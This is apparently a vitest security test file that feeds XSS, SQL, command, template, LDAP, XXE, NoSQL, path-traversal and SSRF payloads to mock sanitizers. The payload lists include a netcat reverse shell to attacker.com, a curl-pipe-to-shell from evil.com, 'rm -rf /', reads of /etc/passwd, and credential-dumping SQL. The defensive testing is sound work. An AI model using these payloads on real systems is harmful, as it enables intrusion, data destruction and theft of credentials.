/**
 * Injection Attack Security Tests
 *
 * Tests resistance to XSS, SQL injection, command injection, template injection,
 * and other code injection attacks.
 */

import { describe, it, expect } from 'vitest';

// XSS payloads
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<<SCRIPT>alert(1)//<</ SCRIPT>',
  '<scr<script>ipt>alert(1)</script>',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '<script>alert(String.fromCharCode(88,83,83))</script>',
];

// SQL Injection payloads
const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE users--",
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",
  "' UNION SELECT password FROM users--",
  "1'; WAITFOR DELAY '00:00:05'--",
  "1' AND SLEEP(5)--",
  "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
  "' UNION SELECT NULL, username, password FROM users--",
];

// Command Injection payloads
const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la /',
  '| cat /etc/passwd',
  '& whoami',
  '`id`',
  '$(whoami)',
  '; rm -rf /',
  '| nc attacker.com 1234 -e /bin/sh',
  '& curl http://evil.com/shell.sh | sh',
  '; python -c "import os; os.system(\'ls\')"',
  '| perl -e \'system("whoami")\'',
];

// Template Injection payloads
const TEMPLATE_INJECTION_PAYLOADS = [
  '{{7*7}}',
  '${7*7}',
  '<%=7*7%>',
  '<%= 7*7 %>',
  '{{constructor.constructor("return process")()}}',
  '${constructor.constructor("return process")()}',
  '{{config.items}}',
  '{{request.application.__globals__}}',
  '{{"".__class__.__mro__[1].__subclasses__()}}',
  '{__import__("os").system("id")}',
];

// LDAP Injection payloads
const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(&',
  '*)(uid=*',
  '*()|&',
  'admin)(&(password=*',
];

// XML Injection payloads
const XML_INJECTION_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<?xml-stylesheet type="text/xsl" href="http://evil.com/evil.xsl"?>',
];

// NoSQL Injection payloads
const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt":""}',
  '{"$ne":null}',
  '{"$regex":".*"}',
  '{"$where":"sleep(5000)"}',
  '{"username":{"$regex":"^admin"},"password":{"$regex":"^.*"}}',
];

// Path Traversal payloads
const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\SAM',
  '....//....//....//etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
];

// SSRF payloads
const SSRF_PAYLOADS = [
  'http://localhost',
  'http://127.0.0.1',
  'http://169.254.169.254/latest/meta-data/',
  'http://[::1]',
  'http://0.0.0.0',
  'file:///etc/passwd',
  'dict://localhost:11211',
  'gopher://localhost:25',
];

describe('Injection Attack Security Tests', () => {
  describe('XSS Prevention', () => {
    XSS_PAYLOADS.forEach((payload, index) => {
      it(`should sanitize XSS payload #${index + 1}: ${payload.substring(0, 50)}`, () => {
        // Mock output sanitization function
        const sanitizeOutput = (input: string): string => {
          return input
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;');
        };

        const sanitized = sanitizeOutput(payload);

        // Should not contain raw/unescaped HTML tags
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('<iframe');

        // Should contain escaped entities for dangerous characters
        if (payload.includes('<')) {
          expect(sanitized).toContain('&lt;');
        }
        if (payload.includes('>')) {
          expect(sanitized).toContain('&gt;');
        }
      });
    });

    it('should use Content-Security-Policy headers', () => {
      // Mock CSP header check
      const headers = {
        'Content-Security-Policy': "default-src 'self'; script-src 'self'",
      };

      expect(headers['Content-Security-Policy']).toBeDefined();
      expect(headers['Content-Security-Policy']).toContain("default-src 'self'");
    });

    it('should escape user input in HTML context', () => {
      const userInput = '<script>alert(1)</script>';
      const escaped = userInput
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

      expect(escaped).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });
  });

  describe('SQL Injection Prevention', () => {
    SQL_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent SQL injection #${index + 1}: ${payload.substring(0, 50)}`, () => {
        // Mock parameterized query function
        const useParameterizedQuery = (query: string, params: any[]): boolean => {
          // Parameterized queries should never concatenate user input
          return !query.includes(payload);
        };

        // Simulate using parameterized queries
        const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
        const params = [payload, 'password123'];

        expect(useParameterizedQuery(query, params)).toBe(true);
      });
    });

    it('should use prepared statements', () => {
      // Mock prepared statement check
      const isPreparedStatement = (query: string): boolean => {
        return query.includes('?') || query.includes('$1');
      };

      const safeQuery = 'SELECT * FROM users WHERE id = ?';
      const unsafeQuery = "SELECT * FROM users WHERE id = '" + 123 + "'";

      expect(isPreparedStatement(safeQuery)).toBe(true);
      expect(isPreparedStatement(unsafeQuery)).toBe(false);
    });

    it('should validate and sanitize database inputs', () => {
      const validateUserId = (userId: string): boolean => {
        // Only allow alphanumeric characters
        return /^[a-zA-Z0-9]+$/.test(userId);
      };

      expect(validateUserId('user123')).toBe(true);
      expect(validateUserId("user'; DROP TABLE--")).toBe(false);
    });
  });

  describe('Command Injection Prevention', () => {
    COMMAND_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent command injection #${index + 1}: ${payload.substring(0, 50)}`, () => {
        // Mock command sanitization
        const isCommandSafe = (input: string): boolean => {
          const dangerousChars = [';', '|', '&', '`', '$', '(', ')', '<', '>', '\n'];
          return !dangerousChars.some(char => input.includes(char));
        };

        expect(isCommandSafe(payload)).toBe(false);
      });
    });

    it('should validate command arguments', () => {
      const validateFilename = (filename: string): boolean => {
        // Only allow safe filenames
        return /^[a-zA-Z0-9_\-\.]+$/.test(filename);
      };

      expect(validateFilename('document.pdf')).toBe(true);
      expect(validateFilename('; rm -rf /')).toBe(false);
    });

    it('should use allowlist for system commands', () => {
      const allowedCommands = ['ls', 'pwd', 'date'];
      const isAllowedCommand = (cmd: string): boolean => {
        return allowedCommands.includes(cmd);
      };

      expect(isAllowedCommand('ls')).toBe(true);
      expect(isAllowedCommand('rm')).toBe(false);
    });
  });

  describe('Template Injection Prevention', () => {
    TEMPLATE_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent template injection #${index + 1}: ${payload.substring(0, 50)}`, () => {
        // Mock template sanitization
        const sanitizeTemplate = (input: string): string => {
          // Remove template syntax
          return input
            .replace(/\{\{.*?\}\}/g, '')
            .replace(/\$\{.*?\}/g, '')
            .replace(/<%.*?%>/g, '');
        };

        const sanitized = sanitizeTemplate(payload);

        // Should not contain template syntax
        expect(sanitized).not.toContain('{{');
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('<%');
      });
    });

    it('should use sandboxed template rendering', () => {
      // Mock sandboxed template engine
      const renderSafe = (template: string, context: Record<string, any>): string => {
        // Should only allow safe property access
        const allowedKeys = Object.keys(context);
        return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
          return allowedKeys.includes(key) ? String(context[key]) : '';
        });
      };

      const template = '{{name}} - {{age}}';
      const context = { name: 'John', age: 30 };

      expect(renderSafe(template, context)).toBe('John - 30');
      expect(renderSafe('{{constructor}}', context)).toBe('');
    });
  });

  describe('LDAP Injection Prevention', () => {
    LDAP_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent LDAP injection #${index + 1}: ${payload}`, () => {
        // Mock LDAP filter sanitization
        const escapeLDAP = (input: string): string => {
          return input
            .replace(/\\/g, '\\5c') // Replace backslash FIRST to avoid double-escaping
            .replace(/\*/g, '\\2a')
            .replace(/\(/g, '\\28')
            .replace(/\)/g, '\\29')
            .replace(/\|/g, '\\7c')
            .replace(/&/g, '\\26');
        };

        const escaped = escapeLDAP(payload);

        // Should contain LDAP escape sequences
        if (payload.includes('*')) {
          expect(escaped).toContain('\\2a');
        }
        if (payload.includes('(') || payload.includes(')')) {
          expect(escaped).toMatch(/\\2[89]/);
        }
      });
    });
  });

  describe('XML Injection Prevention', () => {
    XML_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent XML injection #${index + 1}`, () => {
        // Mock XML parser with XXE and injection protection
        const parseXMLSafely = (xml: string): boolean => {
          // Reject DOCTYPE, ENTITY, CDATA, and processing instructions with external refs
          if (xml.includes('<!DOCTYPE') || xml.includes('<!ENTITY')) {
            return false;
          }
          if (xml.includes('<![CDATA[<script')) {
            return false; // Reject CDATA with script tags
          }
          if (xml.includes('<?xml-stylesheet') && xml.includes('href=')) {
            return false; // Reject external stylesheet references
          }
          return true;
        };

        expect(parseXMLSafely(payload)).toBe(false);
      });
    });

    it('should disable external entity resolution', () => {
      // Mock XML parser configuration
      const xmlParserConfig = {
        resolveExternalEntities: false,
        loadExternalDTD: false,
      };

      expect(xmlParserConfig.resolveExternalEntities).toBe(false);
      expect(xmlParserConfig.loadExternalDTD).toBe(false);
    });
  });

  describe('NoSQL Injection Prevention', () => {
    NOSQL_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent NoSQL injection #${index + 1}: ${payload}`, () => {
        // Mock NoSQL query validation with recursive check
        const hasMongoOperator = (obj: any): boolean => {
          if (typeof obj !== 'object' || obj === null) return false;

          const mongoOperators = ['$gt', '$ne', '$regex', '$where'];

          for (const key of Object.keys(obj)) {
            if (mongoOperators.includes(key)) return true;
            if (typeof obj[key] === 'object' && hasMongoOperator(obj[key])) {
              return true;
            }
          }
          return false;
        };

        const isValidQuery = (query: any): boolean => {
          return !hasMongoOperator(query);
        };

        const parsedPayload = JSON.parse(payload);
        expect(isValidQuery(parsedPayload)).toBe(false);
      });
    });

    it('should validate input types', () => {
      const validateUserId = (userId: any): boolean => {
        // Should only accept strings/numbers, not objects
        return typeof userId === 'string' || typeof userId === 'number';
      };

      expect(validateUserId('user123')).toBe(true);
      expect(validateUserId({ $ne: null })).toBe(false);
    });
  });

  describe('Path Traversal Prevention', () => {
    PATH_TRAVERSAL_PAYLOADS.forEach((payload, index) => {
      it(`should prevent path traversal #${index + 1}: ${payload}`, () => {
        // Mock path sanitization
        const sanitizePath = (path: string): string => {
          // Remove all directory traversal attempts
          return path.replace(/\.\./g, '').replace(/\\/g, '/');
        };

        const sanitized = sanitizePath(payload);

        // Should not contain directory traversal sequences
        expect(sanitized).not.toContain('..');
      });
    });

    it('should validate file paths against allowlist', () => {
      const isAllowedPath = (path: string): boolean => {
        // Only allow paths within allowed directory
        const allowedBase = '/var/data/uploads';
        const normalized = path.replace(/\\/g, '/');
        return normalized.startsWith(allowedBase) && !normalized.includes('..');
      };

      expect(isAllowedPath('/var/data/uploads/file.txt')).toBe(true);
      expect(isAllowedPath('/var/data/uploads/../../../etc/passwd')).toBe(false);
      expect(isAllowedPath('/etc/passwd')).toBe(false);
    });
  });

  describe('SSRF Prevention', () => {
    SSRF_PAYLOADS.forEach((payload, index) => {
      it(`should prevent SSRF #${index + 1}: ${payload}`, () => {
        // Mock URL validation
        const isAllowedURL = (url: string): boolean => {
          try {
            const parsed = new URL(url);

            // Block local addresses
            const blockedHosts = [
              'localhost',
              '127.0.0.1',
              '0.0.0.0',
              '169.254.169.254',
              '[::1]',
            ];

            // Block file protocol
            if (parsed.protocol === 'file:') return false;

            // Block internal IPs
            if (blockedHosts.some(host => parsed.hostname.includes(host))) {
              return false;
            }

            return true;
          } catch {
            return false;
          }
        };

        expect(isAllowedURL(payload)).toBe(false);
      });
    });

    it('should use URL allowlist', () => {
      const allowedDomains = ['api.example.com', 'cdn.example.com'];

      const isAllowedDomain = (url: string): boolean => {
        try {
          const parsed = new URL(url);
          return allowedDomains.includes(parsed.hostname);
        } catch {
          return false;
        }
      };

      expect(isAllowedDomain('https://api.example.com/data')).toBe(true);
      expect(isAllowedDomain('http://localhost/admin')).toBe(false);
    });
  });

  describe('Input Validation', () => {
    it('should validate email format', () => {
      const validateEmail = (email: string): boolean => {
        // Strict email validation rejecting HTML/special characters
        return /^[a-zA-Z0-9._+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
      };

      expect(validateEmail('user@example.com')).toBe(true);
      expect(validateEmail('user@')).toBe(false);
      expect(validateEmail('<script>alert(1)</script>@example.com')).toBe(false);
    });

    it('should validate URL format', () => {
      const validateURL = (url: string): boolean => {
        try {
          new URL(url);
          return true;
        } catch {
          return false;
        }
      };

      expect(validateURL('https://example.com')).toBe(true);
      expect(validateURL('javascript:alert(1)')).toBe(true); // Valid URL but dangerous
      expect(validateURL('not a url')).toBe(false);
    });

    it('should validate integer inputs', () => {
      const validateInteger = (value: any): boolean => {
        return Number.isInteger(Number(value)) && Number(value) >= 0;
      };

      expect(validateInteger('123')).toBe(true);
      expect(validateInteger(123)).toBe(true);
      expect(validateInteger('abc')).toBe(false);
      expect(validateInteger('-1')).toBe(false);
    });

    it('should enforce length limits', () => {
      const validateLength = (input: string, max: number): boolean => {
        return input.length <= max;
      };

      expect(validateLength('short', 100)).toBe(true);
      expect(validateLength('x'.repeat(1000), 100)).toBe(false);
    });
  });

  describe('Output Encoding', () => {
    it('should HTML encode output', () => {
      const htmlEncode = (input: string): string => {
        return input
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');
      };

      expect(htmlEncode('<script>alert(1)</script>')).toBe(
        '&lt;script&gt;alert(1)&lt;/script&gt;'
      );
    });

    it('should JavaScript encode output', () => {
      const jsEncode = (input: string): string => {
        return input
          .replace(/\\/g, '\\\\')
          .replace(/'/g, "\\'")
          .replace(/"/g, '\\"')
          .replace(/\n/g, '\\n')
          .replace(/\r/g, '\\r');
      };

      expect(jsEncode("'; alert(1); //")).toContain("\\'");
    });

    it('should URL encode output', () => {
      const urlEncode = (input: string): string => {
        return encodeURIComponent(input);
      };

      expect(urlEncode('<script>alert(1)</script>')).not.toContain('<');
      expect(urlEncode('../../etc/passwd')).not.toContain('/');
    });
  });
});
